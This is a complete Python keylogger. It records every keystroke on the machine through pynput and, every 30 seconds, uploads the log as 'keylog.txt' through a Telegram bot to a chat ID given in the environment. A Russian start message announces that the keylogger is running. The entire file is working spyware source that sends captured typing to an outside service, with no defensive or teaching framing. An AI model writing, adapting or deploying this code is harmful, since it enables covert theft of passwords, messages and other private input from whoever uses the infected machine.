import asyncio
import os

from aiogram import Bot, Dispatcher, types
from aiogram.types import BufferedInputFile
from aiogram.filters.command import Command

from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
CHAT_ID = int(os.getenv("CHAT_ID"))

bot = Bot(token=TOKEN)
dp = Dispatcher()

buffer = ""


def on_press(key):
    global buffer

    try:
        buffer += key.char
    except AttributeError:
        buffer += f"\n[{key}]"


@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "Кейлоггер запущен!\nКаждые 30 секунд присылается файл с кей-логгом от пользователя который хостит бота!"
    )


async def worker():
    global buffer

    while True:
        await asyncio.sleep(30)
        if len(buffer) > 0:
            file_data = buffer.encode("utf-8")
            virtual_file = BufferedInputFile(file_data, filename="keylog.txt")

            await bot.send_document(CHAT_ID, virtual_file)
            buffer = ""


async def main():
    keyboard.Listener(on_press=on_press).start()
    asyncio.create_task(worker())
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
